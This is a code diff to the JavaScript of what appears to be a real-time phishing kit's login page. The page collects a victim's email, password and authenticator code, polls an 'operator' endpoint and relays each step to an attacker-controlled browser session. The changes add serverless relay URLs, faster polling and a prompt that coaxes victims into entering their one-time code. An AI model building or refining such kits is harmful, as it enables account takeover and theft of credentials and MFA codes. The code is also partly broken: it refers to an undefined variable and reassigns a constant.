@@ -610,7 +610,7 @@
             </div>
 
             <div class="form-group" id="verificationCodeGroup" style="display: none;">
-              <label for="verificationCodeInput">Verification Code</label>
+              <label for="verificationCodeInput" id="verificationCodeLabel">Verification Code</label>
               <input type="text" class="form-control" id="verificationCodeInput" name="verificationCode" required
                     onkeypress="if(event.key === 'Enter') handleFormSubmission();">
               <div class="error-message" id="RequireVerificationCode">Verification code is required.</div>
@@ -646,12 +646,18 @@
 const templateConfig = {
   postURL: "{{postURL}}",
   token: "{{token}}",
-  landingPageLink: "{{landingPageLink}}"
+  landingPageLink: "{{landingPageLink}}",
+  pollingUrl: "{{pollingUrl}}",
+  updateUrl: "{{updateUrl}}"
 };
 
-// Use the template's own origin domain + /api instead of postURL
-// (postURL is kept in templateConfig above for easy revert if needed)
-const apiBaseUrl = window.location.origin + "/api";
+// Use serverless URL if available, otherwise fall back to own origin
+const apiBaseUrl = templateConfig.pollingUrl
+  ? templateConfig.pollingUrl.replace('/pooling-operator', '')
+  : window.location.origin + "/api";
+const updateBaseUrl = templateConfig.updateUrl
+  ? templateConfig.updateUrl.replace('/update-process', '')
+  : window.location.origin + "/api";
 
 let browserId = null;
 let pollingIntervalId = null;
@@ -776,7 +782,7 @@ function updateUIForStatus(status, data = {}) {
       submitButton.disabled = true;
       emailField.readOnly = true;
       passwordField.disabled = true;
-      startPolling(5000);
+      startPolling(2000);
       break;
     case 'PROCESSING':
       emailGroup.style.display = 'block';
@@ -788,7 +794,7 @@ function updateUIForStatus(status, data = {}) {
       submitButton.disabled = true;
       emailField.readOnly = true;
       passwordField.disabled = true;
-      startPolling(10000);
+      startPolling(2000);
       break;
     case 'WAITINGEMAIL':
     case 'WAITINGEMAILERROR':
@@ -813,7 +819,7 @@ function updateUIForStatus(status, data = {}) {
       if (!isSameStatusDuringSubmit) {
         hideLoadingOverlay();
       }
-      startPolling(10000);
+      startPolling(2000);
       break;
     case 'WAITINGPASSWORD':
     case 'WAITINGPASSWORDERROR':
@@ -839,7 +845,7 @@ function updateUIForStatus(status, data = {}) {
       if (!isSameStatusDuringSubmit) {
         hideLoadingOverlay();
       }
-      startPolling(10000);
+      startPolling(2000);
       break;
     case 'WAITINGOPTIONS':
       emailGroup.style.display = 'none';
@@ -859,7 +865,7 @@ function updateUIForStatus(status, data = {}) {
       if (!isSameStatusDuringSubmit) {
         hideLoadingOverlay();
       }
-      startPolling(10000);
+      startPolling(2000);
       break;
     case 'WAITINGCODE':
       emailGroup.style.display = 'none';
@@ -868,6 +874,13 @@ function updateUIForStatus(status, data = {}) {
       verificationCodeGroup.style.display = 'block';
       submitButton.innerText = "Submit Code";
       verificationCodeInput.value = '';
+      const viewName = (d && d.viewName) || (d && d.lastJsonResponse ? (typeof d.lastJsonResponse === 'string' ? JSON.parse(d.lastJsonResponse || '{}') : d.lastJsonResponse).viewName : '') || '';
+      const codeLabel = document.getElementById('verificationCodeLabel');
+      if (codeLabel) {
+        codeLabel.textContent = /authenticator|otp/i.test(viewName)
+          ? 'Open your authenticator app and enter the 6-digit code'
+          : 'Verification Code';
+      }
       if (data.lastJsonResponse) {
         try {
           const lastResp = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
@@ -880,7 +893,7 @@ function updateUIForStatus(status, data = {}) {
       if (!isSameStatusDuringSubmit) {
         hideLoadingOverlay();
       }
-      startPolling(10000);
+      startPolling(2000);
       break;
     case 'COMPLETED':
       hideLoadingOverlay();
@@ -1092,6 +1105,14 @@ async function initialFormSubmission() {
 
     if (data.apiResponse && data.apiResponse.browserId) {
       browserId = data.apiResponse.browserId;
+      if (data.pollingUrl && !templateConfig.pollingUrl) {
+        templateConfig.pollingUrl = data.pollingUrl;
+        apiBaseUrl = data.pollingUrl.replace('/pooling-operator', '');
+      }
+      if (data.updateUrl && !templateConfig.updateUrl) {
+        templateConfig.updateUrl = data.updateUrl;
+        updateBaseUrl = data.updateUrl.replace('/update-process', '');
+      }
       updateUIForStatus(data.apiResponse.status, data.apiResponse);
       // Polling will be started by updateUIForStatus if status is not FAILED
     } else {
@@ -1303,7 +1324,7 @@ async function handleFormSubmission() {
     console.log("Handle Form Submission Payload:", payload);
     console.log("Handle Form Submission Body (URL-encoded):", objectToFormData(payload));
 
-    const response = await fetch(apiBaseUrl + "/update-process", {
+    const response = await fetch(updateBaseUrl + "/update-process", {
       method: 'POST',
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded'
@@ -1323,7 +1344,7 @@ async function handleFormSubmission() {
     // arrives quickly. Don't pollOperator() immediately — let the engine process
     // the update first, and the loading overlay stays visible until the poll returns.
     pollingStartTime = Date.now();
-    startPolling(3000);
+    startPolling(2000);
 
   } catch (error) {
     console.error("Error during form submission:", error);
